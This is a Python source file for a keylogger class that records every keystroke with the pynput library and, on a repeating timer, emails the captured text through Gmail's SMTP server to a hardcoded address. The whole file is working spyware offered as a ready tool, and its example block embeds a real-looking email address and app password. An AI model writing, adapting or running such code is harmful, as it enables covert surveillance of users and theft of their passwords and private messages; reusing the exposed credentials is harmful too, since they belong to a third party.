#!/usr/bin/env python

import smtplib
import threading
from pynput import keyboard

class ImprovedKeyLogger:
    def __init__(self, time_interval: int, email_address: str, email_password: str) -> None:
        self.interval = time_interval
        self.log = "ImprovedKeyLogger has started..."
        self.email_address = email_address
        self.email_password = email_password

    def append_to_log(self, string_to_append):
        assert isinstance(string_to_append, str)
        self.log += string_to_append

    def on_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " "
            elif key == keyboard.Key.esc:
                print("Exiting program...")
                return False
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)

    def send_email(self, to_email, from_email, password, message):
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(from_email, password)
            server.sendmail(from_email, to_email, message)
        except Exception as e:
            print(f"Error sending email: {e}")
        finally:
            server.quit()

    def report_and_send_email(self) -> None:
        if self.log:
            self.send_email(self.email_address, self.email_address, self.email_password, "\n\n" + self.log)
            self.log = ""

        timer = threading.Timer(self.interval, self.report_and_send_email)
        timer.start()

    def start_logging(self) -> None:
        with keyboard.Listener(on_press=self.on_key_press) as keyboard_listener:
            self.report_and_send_email()
            keyboard_listener.join()

if __name__ == "__main__":
    # Example usage
    target_email_address = "bendada.ouss01@gmail.com"
    sender_email_password = "molxnircjdfkbshp"
    reporting_interval_seconds = 60  # Set the interval in seconds

    logger = ImprovedKeyLogger(reporting_interval_seconds, target_email_address, sender_email_password)
    logger.start_logging()
